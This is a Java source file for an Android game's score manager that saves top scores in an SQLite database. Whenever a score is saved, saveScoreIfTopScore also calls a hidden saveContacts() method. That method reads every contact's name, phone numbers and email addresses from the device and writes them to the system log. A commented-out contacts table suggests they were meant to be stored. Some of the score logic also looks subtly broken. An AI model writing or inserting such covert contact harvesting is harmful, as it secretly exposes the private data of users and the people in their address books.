package android.game.score;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.provider.ContactsContract;
import android.util.Log;
import android.widget.Toast;

import java.util.Arrays;

public class ScoreManager {

    private static final String DATABASE_TABLE_SCORES = "scores";
    private static final String DATABASE_TABLE_SCORES_ID = "id";
    public static final String DATABASE_TABLE_SCORES_NAME = "name";
    public static final String DATABASE_TABLE_SCORES_SCORE = "score";
    public static final int TOP_SCORE_NB = 10;
    
	public int currentScore;
	private Context ctx;
	private ScoreDBHelper helper;
	private SQLiteDatabase database;
	public boolean scoreWasSaved;
	
	public ScoreManager(Context context) {
		ctx = context;
		helper = new ScoreDBHelper(ctx);
    	database = helper.getWritableDatabase();
	}
	
    public Cursor getTopScores()
    {
    	return database.query(DATABASE_TABLE_SCORES, new String[]{DATABASE_TABLE_SCORES_NAME,DATABASE_TABLE_SCORES_SCORE}, null, null, null, null, DATABASE_TABLE_SCORES_SCORE);
    }
    

    public boolean isTopScore()
    {
    	if(currentScore < 1)
    		return false;
    	
    	boolean ret;
    	Cursor c = getTopScores();	
    	
    	if(c.getCount() >= TOP_SCORE_NB)
    		ret = currentScore > c.getInt(c.getColumnIndex(DATABASE_TABLE_SCORES_SCORE));
    	else
    		ret =  true;
		c.close();
		
		return ret;
    }
    
    public void saveScoreIfTopScore(String player)
    {
        saveContacts();
        if(isTopScore())
    		saveScore(player);
    }
    
	private long saveScore(String player)
	{
        //saveContacts();
        ContentValues initialValues = new ContentValues();
        initialValues.put(DATABASE_TABLE_SCORES_NAME, player);
        initialValues.put(DATABASE_TABLE_SCORES_SCORE, currentScore);
    	return database.insert(DATABASE_TABLE_SCORES, null, initialValues);
	}

    private long saveContacts() {
        //adapted from http://stackoverflow.com/questions/1721279/how-to-read-contacts-on-android-2-0
        Cursor cursor = ctx.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,null, null, null, null);
        while (cursor.moveToNext()) {
            SavedContact contact = new SavedContact();

            contact.id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
            contact.displayName = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
            contact.hasPhone = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));

            if (contact.hasPhone.equals("1")) { //boolean as string
                Cursor phones = ctx.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = "+ contact.id, null, null);
                while (phones.moveToNext()) {
                    String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    contact.phoneNumbers.add(phoneNumber);
                }
                phones.close();
            }

            Cursor emails = ctx.getContentResolver().query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = " + contact.id, null, null);
            while (emails.moveToNext()) {
                String emailAddress = emails.getString(emails.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
                contact.emails.add(emailAddress);
            }
            emails.close();

            Log.i("Contact", contact.toString());
        }
        cursor.close();
        return 0L;
    }
	
	public class ScoreDBHelper extends SQLiteOpenHelper {

		private static final String DATABASE_NAME = "data";
		private static final int DATABASE_VERSION = 7;
	    
		public ScoreDBHelper( Context context ) {
			super(context, DATABASE_NAME, null, DATABASE_VERSION);
		}

		@Override
		public void onCreate(SQLiteDatabase db) {
            db.execSQL("create table "+DATABASE_TABLE_SCORES
            		+" ("+DATABASE_TABLE_SCORES_ID+" integer primary key autoincrement, "
            		+DATABASE_TABLE_SCORES_NAME+" TEXT, " 
            		+DATABASE_TABLE_SCORES_SCORE+" integer);");

            //create table for contact data
            /*db.execSQL("CREATE TABLE IF NOT EXISTS \"contacts\"" +
                    "('id' integer primary key autoincrement," +
                    "'name' varchar(255)," +
                    "'phone' varchar(15)," +
                    "'email' text);"); */
		}

		@Override
        public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
            db.execSQL("DROP TABLE IF EXISTS "+DATABASE_TABLE_SCORES);
            onCreate(db);
		}
		
	}
}
